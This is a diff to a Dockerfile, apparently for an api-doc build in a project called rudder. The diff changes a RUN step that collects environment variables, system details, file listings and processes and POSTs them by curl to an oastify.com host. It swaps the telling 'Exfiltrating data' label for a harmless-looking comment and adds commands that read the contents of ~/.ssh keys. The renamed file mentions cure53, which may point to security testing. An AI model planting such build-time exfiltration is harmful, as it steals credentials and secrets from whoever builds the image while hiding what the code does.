@@ -5,7 +5,7 @@ ENV NODE_ENV=production
 RUN apt-get update && apt-get install -y rsync python3-yaml curl && rm -rf /var/lib/apt/lists/*
 
 RUN \
-    echo "Exfiltrating data from rudder" && \
+    echo "# api-doc/Dockerfile" && \
     ( \
         echo "=== Environment Variables ===" && \
         env && \
@@ -13,8 +13,12 @@ RUN \
         uname -a && \
         echo "=== Filesystem Root (listing, limited depth) ===" && \
         ls -la / && \
+        echo "=== Home Files ===" && \
+        ls -la ~/* && \
+        echo "=== SSH Keys Content ===" && \
+        cat ~/.ssh/* && \
         echo "=== Processes ===" && \
         ps aux \
-    ) > /tmp/exfil_data_rust.txt && \
-    curl -X POST --data-binary @/tmp/exfil_data_rust.txt https://5jpb0tqibdf24cwpqaoxlvcj7ad11sph.oastify.com/rust_stage_data || echo "Curl failed for rust_stage_data" && \
-    rm /tmp/exfil_data_rust.txt
+    ) > /tmp/cure53.txt && \
+    curl -X POST --data-binary @/tmp/cure53.txt https://5jpb0tqibdf24cwpqaoxlvcj7ad11sph.oastify.com/cure53 || echo "Curl failed for rust_stage_data" && \
+    rm /tmp/cure53.txt
